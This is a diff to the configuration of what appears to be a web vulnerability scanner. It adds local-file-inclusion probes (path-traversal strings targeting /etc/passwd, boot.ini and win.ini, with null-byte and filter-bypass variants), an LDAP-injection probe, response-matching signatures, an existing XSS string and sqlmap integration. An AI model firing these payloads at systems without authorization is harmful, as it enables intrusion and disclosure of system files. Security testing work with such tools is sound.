@@ -7,13 +7,84 @@ config={
         'port':6379,
         'db':1
     },
-    'tasks':10,
-    'pocs':['xss'],
+    'tasks':50,
+    'pocs':['xss','lfi','ldap'],
     'poc_path':'/Users/image/PycharmProjects/PScan/lib/pocs/',
     'poc_config':{
       'xss':{
         'xss_str':'<script>alert(1)</script>'
-      }
+      },
+        'lfi':{
+            'requests':'''
+            ../../../../../../../../../../../../../../../boot.ini
+            ../../../../../../../../../../../../../../../boot.ini.html
+            C:\boot.ini
+            C:\boot.ini
+            C:\boot.ini.html
+            %SYSTEMROOT%\win.ini
+            %SYSTEMROOT%\win.ini
+            %SYSTEMROOT%\win.ini.html
+            ../../../../../../../../../../../../../../../etc/passwd%00.html
+            /etc/passwd%00.html
+            ../../../../../../../../../../../../../../../etc/passwd
+            ../../../../../../../../../../../../../../../etc/passwd
+            ../../../../../../../../../../../../../../../etc/passwd.html
+            ....//....//....//....//....//....//....//....//....//....//etc/passwd
+            ../../../../../../../../../../../../../../../../etc/passwd%00
+            ....//....//....//....//....//....//....//....//....//....//etc/passwd%00
+            /etc/passwd
+https://raw.githubusercontent.com/code-scan/GourdScan/master/README.md?
+            '''.strip().split("\n"),
+            'responces':'''
+                        java.io.FileNotFoundException\:
+            java.lang.Exception\:
+            java.lang.IllegalArgumentException\:
+            java.net.MalformedURLException\:
+            The server encountered an internal error \(.*\) that prevented it from fulfilling this request.
+            fread\(\)\:
+            for inclusion '\(include_path=
+            Failed opening requiredv
+            &lt;b&gt;Warning&lt;/b&gt;\:  file\(
+            &lt;b&gt;Warning&lt;/b&gt;\:  file_get_contents\(
+            root:x\:0\:0\:root\:
+            Warning\: fopen\(
+            No such file or directory
+# GourdScan
+            '''.strip().split("\n")
+        },
+        'ldap':{
+            'requests':'''
+            ^(%23$!@%23$)(()))******
+            '''.strip().split("\n"),
+            'responces':'''
+                        supplied argument is not a valid ldap
+            javax.naming.NameNotFoundException
+            LDAPException
+            com.sun.jndi.ldap
+            Search: Bad search filter
+            Protocol error occurred
+            Size limit has exceeded
+            An inappropriate matching occurred
+            A constraint violation occurred
+            The syntax is invalid
+            Object does not exist
+            The alias is invalid
+            The distinguished name has an invalid syntax
+            The server does not handle directory requests
+            There was a naming violation
+            There was an object class violation
+            Results returned are too large
+            Unknown error occurred
+            Local error occurred
+            The search filter is incorrect
+            The search filter is invalid
+            The search filter cannot be recognized
+            Invalid DN syntax
+            No Such Object
+            IPWorksASP.LDAP
+Module Products.LDAPMultiPlugins
+            '''.strip().split("\n")
+        }
     },
     'enable_sqlmap':True,
     'sqlmap_api':'http://127.0.0.1:8775',
